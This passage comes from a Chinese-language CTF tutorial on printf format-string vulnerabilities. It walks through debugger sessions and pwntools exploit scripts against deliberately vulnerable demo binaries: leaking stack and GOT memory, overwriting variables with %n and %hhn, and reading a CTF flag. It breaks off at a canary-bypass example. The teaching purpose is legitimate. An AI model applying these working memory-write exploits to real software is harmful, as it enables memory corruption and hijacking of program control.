<li>解析其内容对应的浮点值<br>  对于第一种情况来说，如果提供了一个不可访问地址，比如0，那么程序就会崩溃，所以说即使printf函数没有给出参数，也会按照格式化字符串给出的格式打印出接下来三处地址中的内容<br>  %d ：十进制，输出十进制整数<br>  %s ： 字符串，从内存中读取字符串<br>  %x ： 十六进制，输出十六进制数<br>  %c ： 字符串，输出字符串<br>  %n ： 到目前为止缩写的字符串数<h2 id="漏洞利用方法"><a href="#漏洞利用方法" class="headerlink" title="漏洞利用方法"></a>漏洞利用方法</h2><h3 id="1-程序崩溃"><a href="#1-程序崩溃" class="headerlink" title="1. 程序崩溃"></a>1. 程序崩溃</h3>拿到一个程序之后可以通过输入若干个%s来进行判断是否存在格式化字符串漏洞<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">%s%s%s%s%s%s%s%s%s%s%s%s%s%s</span><br></pre></td></tr></table></figure>
前面讲过没有参数的时候printf函数依然还可以输出格式化字符串对应的地址中的内容，<strong>所以如果存在格式化字符串漏洞，在输入一长串%s之后，printf会将%s作为格式化字符串，将对应地址中的内容以字符串的形式输出出来</strong>。<em>但是栈上不可能每个值都对应了合法地址，所以数字对应的内容可能不存在，这个时候就会使程序崩溃</em>。</li>
</ul>
<p><strong><em>在Linux中，存取无效的指针会引起进程受到SIGSEGV信号，从而使程序非正常终止并产生核心转储</em></strong></p>
<h3 id="2-泄露栈内存"><a href="#2-泄露栈内存" class="headerlink" title="2. 泄露栈内存"></a>2. 泄露栈内存</h3><p>例题如下：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">0x22222222</span>, c = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">#编译如下：gcc -m32 -fno-<span class="built_in">stack</span>-protector -no-pie -o leakmemory leakmemory.c</span><br></pre></td></tr></table></figure></p>
<h4 id="获取栈变量数值"><a href="#获取栈变量数值" class="headerlink" title="获取栈变量数值"></a>获取栈变量数值</h4><p>通过gdb打开程序，在printf处下断点<br>然后按r运行，输入%08x.%08x.%08x<br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250210183257.png" alt="Pasted image 20250210183257"><br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250210183302.png" alt="Pasted image 20250210183302"><br>可以看到格式化字符串的第一个%08x解析的是0x1，第二个%08x解析的是0x22222222，第三个%08x解析的是-1，第四个%s解析的是我们输入的“%08x.%08x.%08x”字符串。所以接下来输入c让程序继续执行，我们预计的情况是会将这四处输出出来：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"><span class="number">00000001.22222222</span>.ffffffff.%<span class="number">08</span>x.%<span class="number">08</span>x.%<span class="number">08</span>x</span><br></pre></td></tr></table></figure>
<p>和我们想象的一样，并且程序会继续停在第二个printf函数处，依然还是看一下栈空间<br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250210183522.png" alt="Pasted image 20250210183522"><br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250210183657.png" alt="Pasted image 20250210183657"><br>可以看到由于第二次printf没有给参数，所以触发了格式化字符串漏洞，可以看到格式化字符串的第一个%08x解析的是0xffffd090，第二个%08x解析的是0xf7fd0410，第三个%08x解析的是0x1。接下来输入c让程序继续执行，我们预计的效果是打印出“ffffd090. f7fd0410. 00000001”</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">ffffd090.f7fd0410<span class="number">.00000001</span>[Inferior <span class="number">1</span> (process <span class="number">2788</span>) exited normally]</span><br></pre></td></tr></table></figure>
<p>我们不只可以用%x%x%x，还可以使用%p来获取数据：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hollk@ubuntu:~/ctf-challenges/pwn/fmtstr/leakmemory$ ./leakmemory </span><br><span class="line">%p.%p.%p</span><br><span class="line"><span class="number">00000001.22222222</span>.ffffffff.%p.%p.%p</span><br><span class="line"><span class="number">0xffe9c200</span><span class="number">.0</span>xf7eee410<span class="number">.0</span>x1</span><br></pre></td></tr></table></figure><br><strong>由于栈上的数据会因为每次分配的内存页不同，所以并不是每次得到的结果都一样</strong>。我们上面使用的方法一直都是依次输出栈中的每个参数，那么我们想要输出一个特定位置的内容，就需要更改一下输入的内容<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">%n$x</span><br></pre></td></tr></table></figure><br>还是通过gdb打开程序，在printf函数下断点，接下来输入r运行起来。这个时候我们按照上面的公式输入%3$x<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/hollk/ctf-challenges/pwn/fmtstr/leakmemory/leakmemory </span><br><span class="line">%<span class="number">3</span>$x</span><br></pre></td></tr></table></figure><br>依旧输入c会打印出“<code>00000001.22222222.ffffffff.%3$x</code>”，并且程序还会停在第二个printf函数处，这个时候我们就需要看一下栈空间了<br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250210183920.png" alt="Pasted image 20250210183920"><br>可以看到我们输入的<code>%3$x</code>被放置到了printf函数格式化字符串的位置，一会我们再讲为什么要输入 <code>%3$x</code>。接下来输入c看一看打印的结果<br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211150946.png" alt="Pasted image 20250211150946"><br>可以看到我们输出的是1，也就是上面的0x1，所以说<code>%3$x</code>解析的是0x1。那么就需要仔细琢磨一下我们输入的<code>%3$x</code><br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211151008.png" alt="Pasted image 20250211151008"><br><strong>事实上我们通过<code>%3$x</code>输出的0x1是格式化字符串的第三个参数，所以我们的%3$x就是第三个参数的意思</strong><br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211151023.png" alt="Pasted image 20250211151023"><br><strong>但是我们实际上输出的是printf的第四个参数，因为格式化字符串就是printf函数的其中一个参数。这样我们就可以不用遍历整个栈，能够指定输出某个栈上的内容</strong></p>
<h4 id="获取栈变量对应字符串"><a href="#获取栈变量对应字符串" class="headerlink" title="获取栈变量对应字符串"></a>获取栈变量对应字符串</h4><p>其实就是把前面格式化字符串的x改成s就可以了，%s会以字符串的形式输出栈地址中的内容，验证过程和上面一样，就不写了<br><strong>小技巧总结</strong></p>
<blockquote>
<p>利用 %x 来获取对应栈的内存，<strong>但建议使用 %p，可以不用考虑位数的区别</strong>。<br>利用 %s 来获取变量所对应地址的内容，只不过<strong>有零截断</strong>。<br>利用 <code>%order$x</code> 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。</p>
<h4 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h4><p>有时候我们想要泄露某个libc函数的got表内容，从而的到其地址，进而获取libc版本以及其他函数的地址，这时候能够完全控制泄露某个指定地址的内存就很重要了。<strong>一般来说在格式化字符漏洞中，我们读取的格式化字符串都在栈上。也就是说在调用输出函数的时候，其实第一个参数的值其实就是该格式化字符串的地址</strong><br>由于我们可以控制格式化字符串，如果我们知道格式化字符串在输出函数调用时是第几个参数，这里假设改格式化字符串相对函数调用为第K个参数。那么就可以通过如下 的方式来获取某个指定地址addr的内容<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">addr%k$s</span><br></pre></td></tr></table></figure><br>下面就是如何确定该格式化字符串为第几个参数的问题了，我们可以通过如下方式确定<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[ tag ]%p%p%p%p%p%p%p%p%p%p%p%p.......</span><br></pre></td></tr></table></figure><br>[tag]为重复某个字符的字节长来作为tag，就是aaaa、bbbb这样就可以。后面个%p会将依次遍历以地址的形式打印出函数参数，试一下：<br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211151337.png" alt="Pasted image 20250211151337"><br>我们输入的AAAA对应后面到0x41414141，也就是格式化字符串的第四个参数，当然我们也可以使用前面的方法：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AAAA%<span class="number">4</span>$p</span><br></pre></td></tr></table></figure>
<p>那么我们想想，如果将AAAA替换成某个函数的got地址，那么程序就会打印出这个函数的真实地址。我们拿scanf函数举例，获取函数got地址就交给我们的pwntools了：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(<span class="string">&#x27;./leakmemory&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./leakmemory&#x27;</span>)</span><br><span class="line">__isoc99_scanf_got = elf.got[<span class="string">&#x27;__isoc99_scanf&#x27;</span>] #获取<span class="built_in">scanf</span>函数的got地址</span><br><span class="line">print hex(__isoc99_scanf_got)</span><br><span class="line">payload = p32(__isoc99_scanf_got) + <span class="string">&#x27;%4$s&#x27;</span> #将AAAA%<span class="number">4</span>$p中的A替换成<span class="built_in">scanf</span>函数的got地址</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;%4$s\n&#x27;</span>)</span><br><span class="line">print hex(u32(sh.recv()[<span class="number">4</span>:<span class="number">8</span>]))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211151436.png" alt="Pasted image 20250211151436"></p>
<h3 id="3-覆盖内存"><a href="#3-覆盖内存" class="headerlink" title="3. 覆盖内存"></a>3. 覆盖内存</h3><p>前面我们通过格式化字符串来泄露栈内存以及任意地址内存，那么这部分我们直接修改栈上变量的值。想要进行覆盖，势必要有一个东西能有写的能力。这个时候就用到了%n<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</span><br></pre></td></tr></table></figure><br>…[ overwrite addr ]….%[ overwrite offset ]$n<br>**其中… 表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数</p>
<p>一般来说，利用分为以下的步骤：<br>• 确定覆盖地址<br>• 确定相对偏移（找格式化字符串中第几个参数）<br>• 进行覆盖</p>
<p>举例：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* example/overflow/overflow.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> a = <span class="number">123</span>, b = <span class="number">456</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> c = <span class="number">789</span>;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;c);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified c.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified a for a small number.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == <span class="number">0x12345678</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified b for a big number!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>简单的讲一下这个例子，三个整型变量a=123、b=456、c=789。a、b是全局变量，c是局部变量，数组s等待我们从scanf函数输入。可以明显的看到第二个printf函数存在格式化字符串漏洞。最后是三个判断，如果c = 16就打印“modified c.”，如果a = 2就打印“modified a for a small number.”，如果b = 0x12345678就打印“modified b for a big number!”</p>
<h4 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h4><p>这里我们选择让c = 16，使程序打印“modified c.”，可以从源码中看到第一次printf打印出了变量c的地址，所以不需要额外找了<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</span><br></pre></td></tr></table></figure><br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211152005.png" alt="Pasted image 20250211152005"><br>我们可以通过结果看到变量s(c的地址)是在格式化字符串的第6个参数，接下来就可以根据上面的公式来构造payload了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./overwrite&#x27;</span>)</span><br><span class="line">c_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) <span class="comment">#获取c变量的地址</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(c_addr)</span><br><span class="line">payload = p32(c_addr) + <span class="string">&#x27;a&#x27;</span>*<span class="number">12</span> + <span class="string">&#x27;%6$n&#x27;</span> <span class="comment">#构建payload</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>首先第一个c_addr就是变量c的地址，可以通过接收第一次printf打印出来的字符获得。因为前面的c_addr已经占了4个字节，第二个%012d是为了补全16个字节，最后的%6$n是为了向第6个参数内写16，这个16就是前面的16个字节。这就是%n的能力<br>执行结果如下，可以看到输出的“modified c.”字符串：<img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211152220.png" alt="Pasted image 20250211152220"></p>
<h4 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h4><h5 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h5><p>这个小是什么小呢，是小于机器字长的数字。拿2举例子，如果我想向变量中存一个2，那就会出现问题，回想一下刚在我们做的例子，%n会将前面输入的字节数存放到指定的参数地址中。但是我们将地址放在最前面，那么经过p32小端序转化之后地址本身就会占4个字节，所以经过%n存放的时候，向变量中写的数一定是大于等于4的，那这样一来我们想向变量中存放2的想法可能就要破灭了。我们拿a = 2举例，使程序输出字符串“modified a for a small number.”<br>但是我们想一想，地址一定要放在最前面吗，我们的%n是可以向指定的参数地址写入数字的，所以把原有的payload该一下：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;aa%k&#x27;</span> + <span class="string">&#x27;$naa&#x27;</span> +p32(a_addr)</span><br></pre></td></tr></table></figure><br>我们把前面的字符串拆分成两部分，每个部分四个字节，因为变量是从第六个参数开始的，所以aa%k是第6个、$naa是第7个、p32(a_addr)是第8个，所以k需要改成8，这样%n就会将“aa”这两个字符的字符数2写在第8个参数，即变量a的地址中：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;aa%8&#x27;</span> + <span class="string">&#x27;$naa&#x27;</span> +p32(a_addr)</span><br></pre></td></tr></table></figure><br>那么这样一来偏移找到了，剩下的就是变量a的地址了，因为a已经进行过初始化了，所以使用ida可以在.data段找到：<br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211154330.png" alt="Pasted image 20250211154330"><br>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./overwrite&#x27;</span>)</span><br><span class="line">a_addr = <span class="number">0x0804A024</span></span><br><span class="line">payload = <span class="string">&#x27;aa%8$naa&#x27;</span> + p32(a_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211154405.png" alt="Pasted image 20250211154405"></p>
<h5 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h5><p>到这里为止，应该对<code>%k$n</code>有一定的了解了，还是那个原则，%k$n前面有多少个字节，那么就会向第k个参数地址中写多少。那么回来，覆盖大数字能有多大呢？拿b = 0x12345678举例，换成十进制的话就是305419896个字节，这就已经非常大了，我们没法构建一个超级长的payload的插入栈中，因为栈的长度可能都没有这么长😁</p>
<p>那么我们改变一下思路，我们一定要一次性写入0x12345678吗？存放变量b的地址空间有4个字节：<br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211154435.png" alt="Pasted image 20250211154435"><br>因为在x86、x64中时按照小端序的形式存储的，所以以b_addr作为基地址开始，依次从右向左在每个字节中写入内容。也就是说我们不必须一次性将变量b的所有位置填满，可以一个字节一个字节的填充。这样填充的方法就用到了格式化字符串里面的两个标志位了：</p>
<blockquote>
<p>h：对于整数类型，printf 期待一个从 short 提升的 int 尺寸的整型参数<br>hh：对于整型类型，printf 期待一个从 char 提升的 int 尺寸的整形参数</p>
</blockquote>
<p>定义很复杂，简单点说如果我们使用了h标志位，那么就会向变量b中一次性写两个字节，写两次填满。使用hh标志位会向变量b中一次性写一个字节，写四次填满。那么我们去想，如果将b_addr放在格式化字符串的第六个参数位置、b_addr + 1放在第7个参数位置、b_addr + 2放在第8个参数位置、b_addr + 3放在第9个参数位置。再通过<code>%6$hhn</code>、<code>%7$hhn</code>、<code>%8$hhn</code>、<code>%9$hhn</code>将0x78、0x56、0x34、0x12写进去是不是就可以了！<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p32(b_addr)+p32(b_addr+<span class="number">1</span>)+p32(b_addr+<span class="number">2</span>)+p32(b_addr+<span class="number">3</span>)</span><br><span class="line">payload += <span class="string">&#x27;%104x&#x27;</span>+<span class="string">&#x27;%6$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%7$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%8$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%9$hhn&#x27;</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>前面的四个p32每个占4字节，一共16个字节，%104x占104个字节，所以104 + 16 = 120 =0x78，所以%6$hhn会将0x78写到第6个参数，即p32(b_addr)的位置</li>
<li>%222x占222个字节，再加上前面的字节数：120 + 222 = 342 = 0x156，因为hh是单字，所以只取后面的0x56，所以%7$hhn会将0x56写到第7个参数，即p32(b_addr + 1)的位置</li>
<li>%222x占222个字节，再加上前面的字节数：342 + 222 = 564 = 0x234，因为hh是单字，所以只取后面的0x34，所以%8$hhn会将0x34写到第8个参数，即p32(b_addr + 2)的位置</li>
<li>%222x占222个字节，再加上前面的字节数：564 + 222 = 0x312，因为hh是单字，所以只取后面的0x12，所以%9$hhn会将0x12写到第9个参数，即p32(b_addr + 3)的位置<br>这样一来我们就完成了对变量b四个字节的填充，填充之后b = 0x12345678，剩下的就是寻找b的地址了，依然还是使用ida在.data里面找到b的地址：<br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211162441.png" alt="Pasted image 20250211162441"><br>这样一来b_addr = 0x0804A028<br>exp如下：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./overwrite&#x27;</span>)</span><br><span class="line">b_addr=<span class="number">0x0804A028</span></span><br><span class="line">payload = p32(b_addr)+p32(b_addr+<span class="number">1</span>)+p32(b_addr+<span class="number">2</span>)+p32(b_addr+<span class="number">3</span>)</span><br><span class="line">payload += <span class="string">&#x27;%104x&#x27;</span>+<span class="string">&#x27;%6$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%7$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%8$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%9$hhn&#x27;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">#sh.sendline(fmtstr_payload(6, &#123;0x804A028:0x12345678&#125;))</span></span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
结果如下，会看到程序打印字符串“modified b for a big number!”<br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211162513.png" alt="Pasted image 20250211162513"></li>
</ul>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="例-1-x64"><a href="#例-1-x64" class="headerlink" title="例(1) x64"></a>例(1) x64</h3><blockquote>
<p>ubuntu24.04运行不了，抄的别的师傅的<br>64位格式化字符串和32位的很相似，做题的步骤也相同，唯一不同的是64位程序对函数参数存储的方式和32位的不同。64为程序会优先将函数的前6个参数放置在寄存器中，超过6个的再存放在栈上，而32位直接存放在栈上。</p>
</blockquote>
<p><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211225455.png" alt="Pasted image 20250211225455"><br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211230001.png" alt="Pasted image 20250211230001"><br>使用gdb打开一下，依然还是在printf处下断点</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; b <span class="built_in">printf</span></span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x400640</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/hollk/ctf-challenges/pwn/fmtstr/<span class="number">2017</span>-UIUCTF-pwn200-GoodLuck/goodluck </span><br><span class="line">what<span class="number">&#x27;</span>s the flag</span><br><span class="line">hollk</span><br></pre></td></tr></table></figure>
<p><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211225615.png" alt="Pasted image 20250211225615">可以看到我们停在了printf函数处。64位程序需要先往寄存器上看，因为格式化字符串作为printf函数的第一个参数，所以理所应当的存放在rdi寄存器中，剩下的RSI、RDX、RCX、R8、R9这5个寄存器会接着存放其他参数。上面看完了往栈上看，可以看到栈顶为printf函数的返回地址，我们想要的flag在返回地址下的第四个。所以如果我们想要打印flag，那么flag距离格式化字符串的偏移就是5 + 4 = 9</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./goodluck&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%9$s&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211230103.png" alt="Pasted image 20250211230103"></p>
<h3 id="例-2-绕过Canary"><a href="#例-2-绕过Canary" class="headerlink" title="例(2) 绕过Canary"></a>例(2) 绕过Canary</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1hVMiXkKJQoiEbYMpPJfsAg">https://pan.baidu.com/s/1hVMiXkKJQoiEbYMpPJfsAg</a><br>提取码:4egx</p>
</blockquote>
<p>走一套流程<br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212125542.png" alt="Pasted image 20250212125542"><br>32位文件，开启了NX和Canary保护</p>
<blockquote>
<p>Canary简介：Canary是一种用来防护栈溢出的保护机制。其原理是在一个函数的入口处，先从fs/gs寄存器中取出一个4字节(eax)或者8字节(rax)的值存到栈上（最低位都是\x00），当函数结束时会检查这个栈上的值是否和存进去的值一致，若一致则正常退出，如果是栈溢出或者其他原因导致Canary的值发生变化，那么程序将执行<code>___stack_chk_fail</code>函数，继而终止程序。</p>
<h2 id="所以如果有一道题开启了canary保护，但不知道canary的值，就不能够进行ROP来劫持程序流程，那么这道题就无法解决了。"><a href="#所以如果有一道题开启了canary保护，但不知道canary的值，就不能够进行ROP来劫持程序流程，那么这道题就无法解决了。" class="headerlink" title="所以如果有一道题开启了canary保护，但不知道canary的值，就不能够进行ROP来劫持程序流程，那么这道题就无法解决了。"></a>所以如果有一道题开启了canary保护，但不知道canary的值，就不能够进行ROP来劫持程序流程，那么这道题就无法解决了。</h2><p>Canary绕过方式一般canary有两种利用方式：<br>1.爆破canary<br>2.如果存在字符串格式化漏洞可以输出canary并利用溢出覆盖canary从而达到绕过</p>
<h2 id="这里我们采用第二种利用方法：printf属于可变参数函数，函数调用者可任意指定参数和数量，这也是漏洞产生的原因。"><a href="#这里我们采用第二种利用方法：printf属于可变参数函数，函数调用者可任意指定参数和数量，这也是漏洞产生的原因。" class="headerlink" title="这里我们采用第二种利用方法：printf属于可变参数函数，函数调用者可任意指定参数和数量，这也是漏洞产生的原因。"></a>这里我们采用第二种利用方法：printf属于可变参数函数，函数调用者可任意指定参数和数量，这也是漏洞产生的原因。</h2></blockquote>
